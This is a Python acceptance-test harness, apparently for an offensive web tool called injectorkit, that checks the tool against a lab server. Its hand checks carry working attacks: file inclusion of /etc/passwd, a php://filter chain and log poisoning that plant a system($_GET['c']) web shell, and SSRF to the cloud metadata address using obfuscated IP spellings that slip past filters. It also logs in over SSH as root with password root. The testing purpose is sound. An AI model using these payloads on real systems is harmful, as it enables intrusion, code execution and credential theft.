"""Does the tool agree with a person holding a shell?

Every release has to be measured against the lab, and measuring it by hand each
time is how a step gets skipped on the busy day. This walks a fixed list of
scenarios, asks each one twice - once the way a person would with curl, once with
injectorkit - and compares the two answers.

The hand side is written independently on purpose. It sends its own requests and
reads the responses itself, sharing no judging code with the tool; a comparison
that used the tool's own logic to decide what the tool should have found would
agree with itself no matter what.

    python lab/acceptance.py                 everything
    python lab/acceptance.py --only lfi      one group
    python lab/acceptance.py --list          what there is

Exit status is 0 when every scenario the tool claimed agrees with the hand
result, and 1 otherwise. A scenario the lab cannot currently serve is SKIPPED,
never a pass.
"""

from __future__ import annotations

import argparse
import base64
import os
import re
import subprocess
import sys
import time
import urllib.error
import urllib.parse
import urllib.request

HOST = os.environ.get("IK_LAB", "192.168.44.149")
ROOT = os.path.dirname(os.path.dirname(os.path.abspath(__file__)))
PY = sys.executable
LAB = f"http://{HOST}:8080"

# The lab's own markers. A hand check that finds one of these has read something
# the application did not put there by accident.
PASSWD = "root:x:0:0"
HOSTNAME_IN_APP = None  # filled in by the baseline, since it changes per container


class Result:
    def __init__(self, name: str, url: str, args: list[str]):
        self.name = name
        self.url = url
        self.args = args
        self.hand: bool | None = None
        self.hand_note = ""
        self.tool = False
        self.tool_note = ""
        self.skipped = ""

    @property
    def agrees(self) -> bool:
        return self.hand == self.tool


# ----------------------------------------------------------------- the controls


def fetch(url: str, data: dict | None = None, headers: dict | None = None, timeout: int = 20):
    """One request, the way a person would make it."""
    body = urllib.parse.urlencode(data).encode() if data else None
    request = urllib.request.Request(url, data=body, headers=headers or {})
    try:
        with urllib.request.urlopen(request, timeout=timeout) as response:
            return response.status, response.read().decode("latin-1", "replace")
    except urllib.error.HTTPError as error:
        return error.code, error.read().decode("latin-1", "replace")
    except Exception as error:  # noqa: BLE001 - a lab that is down is a skip, not a crash
        return 0, f"{type(error).__name__}: {error}"


def reachable(url: str) -> bool:
    status, _ = fetch(url)
    return status != 0


def hand_lfi(base: str, path: str, marker: str) -> tuple[bool, str]:
    """Read a file the way a person would: ask, then look for what came back.

    The lab's include.php takes its file from the query string, so these go in
    the URL. Sending them as a form body instead means the application sees no
    parameter at all and answers the same nothing twice - which reads exactly
    like a target that read nothing, and is how this check first lied.
    """
    missing = "/nonexistent-ik-acceptance/nope"
    _, good = fetch(f"{base}?file={urllib.parse.quote(path, safe='')}")
    _, bad = fetch(f"{base}?file={urllib.parse.quote(missing, safe='')}")
    if marker in good and marker not in bad:
        return True, f"{marker} came back and did not for a missing path"
    if good.strip() == bad.strip():
        return False, "the page answered a missing path with the same bytes"
    return False, "the response changed but carries nothing recognisable"


def hand_wrapper(base: str, payload: str, marker: str) -> tuple[bool, str]:
    """A wrapper, checked by decoding the answer rather than trusting it."""
    status, body = fetch(f"{base}?file={urllib.parse.quote(payload, safe='')}")
    if marker in body:
        return True, f"{marker} is in the response as sent"
    for blob in re.findall(r"[A-Za-z0-9+/=]{24,}", body):
        try:
            decoded = base64.b64decode(blob + "=" * (-len(blob) % 4), validate=True)
        except Exception:  # noqa: BLE001
            continue
        if marker.encode() in decoded:
            return True, f"{marker} was in the response once decoded"
    if f"include({payload})" in body and marker not in body:
        return False, "the page echoed the payload but did not act on it"
    return False, "no marker in the response or in anything decodable from it"


def hand_ssrf(url: str, marker: str) -> tuple[bool, str]:
    """Whether the application fetched something only it could reach."""
    status, body = fetch(url)
    if marker in body:
        return True, f"{marker} came back through the application"
    if status in (403, 406, 419, 501, 999):
        return False, f"the request was refused with {status}"
    return False, "the application did not reach it"


# -------------------------------------------------------------------- the tool


def run_tool(args: list[str], timeout: int = 300) -> tuple[int, str]:
    command = [PY, os.path.join(ROOT, "injectorkit.py"), *args, "--color", "never", "--flush-session"]
    try:
        done = subprocess.run(
            command,
            cwd=ROOT,
            capture_output=True,
            text=True,
            timeout=timeout,
            errors="replace",
        )
    except subprocess.TimeoutExpired:
        return 124, "the run did not finish"
    return done.returncode, done.stdout + done.stderr


def tool_found(output: str) -> bool:
    """Whether the run got what it went for, in any of the shapes that count.

    Three, because the tool reports a result three ways: a fact with `proven` set,
    a finding block that prints the payload that worked, and - for the shell
    routes - the command's own output, which is the strongest evidence of the
    three and the one this check originally missed.
    """
    if re.search(r"^\[\+\] .*(proven = True|command execution confirmed)", output, re.M):
        return True
    if re.search(r"^\s+payload:", output, re.M):
        return True
    # A command that ran leaves its own mark: the passwd line, the uid line, the
    # architecture line. These are outputs, not the word "success".
    if re.search(r"^uid=\d+\(|^\s*root:x:0:0", output, re.M):
        return True
    if re.search(r"^\[-\] (probe|exploit)\.\w+: (raised|service refused)", output, re.M):
        return False
    return bool(re.search(r"^\s+payload:", output, re.M))


# ------------------------------------------------------------------ the catalog

SCENARIOS: list[tuple[str, str, str]] = [
    # group, name, what it is for
    ("lfi", "plain-path", "the application's own include() reading a plain path"),
    ("lfi", "wrapper-base64", "php://filter source disclosure"),
    ("shell", "filter-chain", "code execution through a php://filter chain"),
    ("shell", "log-poisoning", "code execution through a file the server writes"),
    ("ssrf", "internal-service", "an internal service only the application can reach"),
    ("ssrf", "metadata", "the cloud metadata address"),
    ("ssrf", "address-spelling", "a spelling the signature filter does not know"),
    ("waf", "signature-a", "profile a: literal matching"),
    ("waf", "signature-b", "profile b: knows the alternate address spellings"),
    ("waf", "semantic-c", "profile c: parses the destination"),
    ("waf", "whitelist-d", "profile d: only its own host is allowed"),
    ("waf", "first-value-e", "profile e: reads the first value of each parameter"),
    ("waf", "donothack", "the project's acceptance baseline"),
]

# The lab's own vhost writes here, and it is readable by the user php runs as.
# Apache's own /var/log/apache2/access.log is not: it is 640 root:adm.
LAB_LOG = "/opt/injectorkit-lab/logs/apache-access.log"


def scenario_lfi(name: str) -> Result:
    base = f"http://{HOST}:8080/include.php"
    if name == "plain-path":
        url = f"{base}?file=/etc/passwd"
        result = Result(name, url, ["proto", "-u", f"{base}?file=index.php", "--read", "/etc/passwd"])
        result.hand, result.hand_note = hand_lfi(base, "/etc/passwd", PASSWD)
    else:
        payload = "php://filter/convert.base64-encode/resource=/etc/passwd"
        url = f"{base}?file={urllib.parse.quote(payload, safe='')}"
        result = Result(name, url, ["proto", "-u", f"{base}?file=index.php", "--read", "/etc/passwd"])
        result.hand, result.hand_note = hand_wrapper(base, payload, PASSWD)
    return result


def scenario_ssrf(name: str) -> Result:
    base = f"http://{HOST}:8080/fetch.php"
    if name == "internal-service":
        target = "http://127.0.0.1:8899/"
        url = f"{base}?url={urllib.parse.quote(target, safe='')}"
        result = Result(name, url, ["ssrf", "-u", url, "--exploit"])
        result.hand, result.hand_note = hand_ssrf(url, "admin")
    elif name == "metadata":
        target = "http://169.254.169.254/latest/meta-data/"
        url = f"{base}?url={urllib.parse.quote(target, safe='')}"
        result = Result(name, url, ["ssrf", "-u", url])
        result.hand, result.hand_note = hand_ssrf(url, "ami-")
    else:
        # The spelling profile a does not know. Whether it gets through is the
        # question, and the answer is the one the hand check arrives at.
        target = "http://2130706433:8899/"
        url = f"{base}?url={urllib.parse.quote(target, safe='')}"
        result = Result(name, url, ["ssrf", "-u", url, "--exploit"])
        result.hand, result.hand_note = hand_ssrf(url, "admin")
    return result


WAF_PORTS = {
    "signature-a": 8081,
    "signature-b": 8082,
    "semantic-c": 8083,
    "whitelist-d": 8084,
    "first-value-e": 8085,
    "donothack": 8090,
}


def scenario_waf(name: str) -> Result:
    """Behind a filter, the question is not "can it be done" but "does the tool find the way in".

    Every one of these profiles refuses the obvious payload - that is what they
    are for. So the hand check does not ask whether the metadata came back; it
    asks whether *any* destination gets through, trying them one at a time the
    way a person would.

    Two kinds of destination are in that list, and leaving the second out is how
    this check first lied. A whitelist does not care what a request says about an
    outside address - it cares that the address is one of its own, and the
    application's own host is 127.0.0.1. So the metadata spellings are only half
    the question; the services sitting on the application's own host are the
    other half, and they are reachable without any evasion at all.
    """
    port = WAF_PORTS[name]
    base = f"http://{HOST}:{port}/fetch.php"
    plain = "http://169.254.169.254/latest/meta-data/"
    url = f"{base}?url={urllib.parse.quote(plain, safe='')}"
    result = Result(name, url, ["ssrf", "-u", url, "--exploit"])

    outside = [
        ("dotted", "http://169.254.169.254/latest/meta-data/", "ami-id"),
        ("decimal", "http://2852039166/latest/meta-data/", "ami-id"),
        ("hex", "http://0xA9FEA9FE/latest/meta-data/", "ami-id"),
        ("short", "http://169.254.43518/latest/meta-data/", "ami-id"),
        ("trailing-dot", "http://169.254.169.254./latest/meta-data/", "ami-id"),
        ("nil-alias", "http://169.254.169.254.nip.io/latest/meta-data/", "ami-id"),
    ]
    # On the application's own host, which is what a whitelist permits by
    # definition. These are not evasions; they are the targets a filter of that
    # shape was never able to describe as forbidden.
    local = [
        ("local-redis", "dict://127.0.0.1:6379/CONFIG%20GET%20dir", "dir"),
        ("local-admin", "http://127.0.0.1:8899/", "admin"),
    ]

    reached = []
    refused = []
    for label, target, marker in outside:
        probe = f"{base}?url={urllib.parse.quote(target, safe='')}"
        status, body = fetch(probe)
        if marker in body:
            reached.append(label)
        elif status in (403, 406, 419, 501, 999) or "blocked" in body.lower():
            refused.append(label)
    for label, target, marker in local:
        probe = f"{base}?url={urllib.parse.quote(target, safe='')}"
        status, body = fetch(probe)
        if marker in body:
            reached.append(label)

    result.hand = bool(reached)
    if reached:
        result.hand_note = "got through as " + ", ".join(reached)
        if refused:
            result.hand_note += f"; outside addresses refused: {', '.join(refused)}"
    else:
        result.hand_note = "nothing got through, on the host or off it"
    return result


def scenario_shell(name: str) -> Result:
    """Running a command on the target, which is the point of the tool.

    Both routes are checked, and each hand side does what the route does rather
    than trusting the tool's report of it. The log is emptied first: these
    scenarios leave PHP source in the file the next one includes, so without it
    one scenario's leftovers decide the next one's answer.
    """
    trouble = reset_lab_log()
    if trouble:
        result = Result(name, "", [])
        result.skipped = trouble
        return result

    base = f"http://{HOST}:8080/include.php"
    url = f"{base}?file=index.php"

    if name == "filter-chain":
        result = Result(name, url, ["proto", "-u", url, "--exploit", "--os-cmd", "id"])
        # The bare endpoint, not `url`: these helpers append their own query, and
        # handing them one that already has a `file=` leaves two of them in the
        # request. PHP takes the first, so the payload is never the one asked for
        # and the response is the page the target was pointed at all along.
        result.hand, result.hand_note = hand_filter_chain(base)
        return result

    # Log poisoning: plant PHP through the User-Agent, then include the file the
    # server wrote. The payload is the request; no separate command is sent.
    result = Result(
        name, url, ["proto", "-u", url, "--exploit", "--log-path", LAB_LOG, "--os-cmd", "id"]
    )
    result.hand, result.hand_note = hand_log_poison(base, LAB_LOG, "uid=")
    return result


def hand_filter_chain(base: str) -> tuple[bool, str]:
    """Build a filter chain by hand and see whether the chain runs.

    The generator is the tool's own - reimplementing four kilobytes of iconv
    table here would be a second thing to be wrong - so this checks the part that
    can go wrong independently: whether php://filter is accepted at all, and
    whether a chain placed there comes back with command output.

    The resource matters and is easy to get backwards. A chain built to *run*
    code reads from `php://temp`, which is empty and therefore execution-only: the
    decoded bytes come out of the filters rather than from a file. Pointing it at
    /etc/passwd instead asks the chain to read that file, and the response is the
    chain's own payload echoed back with nothing executed - which looks like a
    refusal and is not one.
    """
    status, _ = fetch(f"{base}?file=php://filter/convert.base64-encode/resource=/etc/passwd")
    if status != 200:
        return False, "the application does not answer php://filter at all"

    sys.path.insert(0, ROOT)
    from injectorkit.core.filters import php_runner  # noqa: PLC0415

    chain_text = php_runner("system($_GET['c']);")
    if not chain_text:
        return False, "the chain generator produced nothing for this payload"

    status, body = fetch(f"{base}?file={urllib.parse.quote(chain_text, safe='')}&c=id")
    if "uid=" in body:
        return True, f"a hand-built chain returned {body.strip()[:40]}"
    if status == 414:
        return False, "the chain was longer than the server accepts"
    if chain_text[-40:] in body or "php://filter" in body:
        return False, (
            "the response carries the chain itself and no command output, so the payload was "
            "echoed rather than executed"
        )
    return False, f"the chain was sent and answered {status} without command output"


def hand_log_poison(base: str, log_path: str, marker: str) -> tuple[bool, str]:
    """Plant code the way the server records it, then ask the application to run it.

    Single quotes, and that is the lesson this scenario was written from: apache
    escapes the quotes in a request line, so a payload written with double quotes
    lands in the log as `$_GET[\\"c\\"]` and including it is a parse error rather
    than a command. Payloads that survive an access log have to survive being
    written into one.

    The log is written asynchronously, so there is a pause between planting and
    reading. Then there is exactly one read, and that is deliberate: reading the
    log is itself a request, this application's requests are written to the log,
    and those lines carry a quoted user-agent field. A retry loop appends one
    every time it looks, and enough of them make the file stop parsing - a check
    that retries can break the thing it is checking.
    """
    planted = "<?php echo 'IKACCEPT'; system($_GET['c']); ?>"
    target = f"{base}?file={urllib.parse.quote(log_path, safe='')}&c=id"

    fetch(base, headers={"User-Agent": planted})
    time.sleep(1.5)
    status, body = fetch(target)

    # A 500 is checked, not dismissed. Including a log that already holds earlier
    # requests often ends in a parse error partway through - and PHP emits what it
    # had produced before the error, so the command's output can be sitting in a
    # response that still carries a 500. The output is the evidence; the status is
    # the application's opinion of the file it was asked to read.
    if marker in body:
        return True, f"the planted code ran: {marker} came back (status {status})"
    if status != 200:
        return False, (
            f"including the log answered {status} without the command's output in it, so the "
            "file stopped parsing before reaching the line this check wrote"
        )

    # The whole log is included, so the line just appended has to fall within what
    # the application reads. A log that has been running a while does not.
    if len(body) > 4096:
        return False, (
            f"the log was returned ({len(body)} bytes) but the response stops before the end "
            "of it, so the line just written was never reached"
        )
    return False, "the log came back without the planted code in it"


def build(group: str, name: str) -> Result:
    if group == "lfi":
        return scenario_lfi(name)
    if group == "shell":
        return scenario_shell(name)
    if group == "ssrf":
        return scenario_ssrf(name)
    return scenario_waf(name)


# ---------------------------------------------------------------------- driver


def reset_lab_log() -> str:
    """Empty the lab's access log, because the scenarios write into it.

    Log poisoning leaves PHP source in that file, and the whole file is included
    by every later request that points at it - including a scenario run earlier
    having left a payload with a syntax error in it. So one scenario's leftovers
    decide the next one's answer. The log is truncated over SSH rather than left
    to the operator, and a failure to do it is reported instead of guessed at.
    """
    command = (
        f": > {LAB_LOG} && chmod 644 {LAB_LOG} && wc -c < {LAB_LOG}"
    )
    ssh = os.path.join(ROOT, "tools", "fastcrack", "fastcrack_010_windows_amd64", "fastcrack.exe")
    if not os.path.exists(ssh):
        return "fastcrack is not unpacked under tools/, so the log cannot be reset"
    arguments = [ssh, "ssh", HOST, "-u", "root", "-p", "root", "-x", command, "--no-bruteforce"]
    done = subprocess.run(
        arguments, capture_output=True, text=True, timeout=120, errors="replace"
    )
    if done.returncode != 0:
        return f"could not truncate {LAB_LOG}"

    # Confirm it, rather than trusting the redirect, and confirm the right thing:
    # empty is what the file is being reset to, and a file that is empty also has
    # to be *parseable*, because the first scenario to run leaves its own request
    # in there and the next one has to survive reading it. A file that comes back
    # as a 500 is not usable ground however few bytes it holds.
    for _ in range(10):
        status, body = fetch(f"{LAB}/include.php?file={urllib.parse.quote(LAB_LOG, safe='')}")
        if status == 200 and len(body) < 200:
            return ""
        time.sleep(0.5)
    return f"{LAB_LOG} did not come back empty and readable"


def main() -> int:
    parser = argparse.ArgumentParser(description=__doc__.splitlines()[0])
    parser.add_argument("--only", help="run one group: lfi, ssrf or waf")
    parser.add_argument("--list", action="store_true", help="list the scenarios and stop")
    parser.add_argument("--quiet", action="store_true", help="only print the summary")
    args = parser.parse_args()

    if args.list:
        for group, name, what in SCENARIOS:
            print(f"{group:6} {name:18} {what}")
        return 0

    if not reachable(f"http://{HOST}:8080/include.php?file=/etc/passwd"):
        print(f"the lab at {HOST}:8080 is not answering; start it with lab/setup.sh")
        return 1

    results: list[Result] = []
    for group, name, what in SCENARIOS:
        if args.only and group != args.only:
            continue
        result = build(group, name)

        if result.skipped:
            pass
        elif not reachable(result.url):
            result.skipped = "the endpoint is not answering"
        else:
            code, output = run_tool(result.args)
            result.tool = tool_found(output)
            result.tool_note = "found" if result.tool else f"nothing (exit {code})"

        results.append(result)
        if not args.quiet:
            mark = "SKIP" if result.skipped else ("agree" if result.agrees else "DISAGREE")
            print(f"[{mark:8}] {group}/{name}")
            print(f"           hand: {result.hand_note or result.skipped}")
            print(f"           tool: {result.tool_note}")

        # After as well as before. Everything these scenarios do to the log is
        # written to the log - that is the whole trick - so the file grows with
        # each one and a later scenario's payload lands past the point the
        # application reads to. Leaving it clean between scenarios is what makes
        # each of them a test of itself rather than of the one before it.
        if group == "shell":
            reset_lab_log()

    skipped = [r for r in results if r.skipped]
    checked = [r for r in results if not r.skipped]
    wrong = [r for r in checked if not r.agrees]

    print()
    print(f"checked {len(checked)}, agreed {len(checked) - len(wrong)}, disagreed {len(wrong)}"
          + (f", skipped {len(skipped)}" if skipped else ""))
    for result in wrong:
        print(f"  {result.name}: hand says {result.hand}, the tool says {result.tool}")
        print(f"    hand was: {result.hand_note}")
    for result in skipped:
        print(f"  skipped {result.name}: {result.skipped}")

    return 1 if wrong else 0


if __name__ == "__main__":
    sys.exit(main())
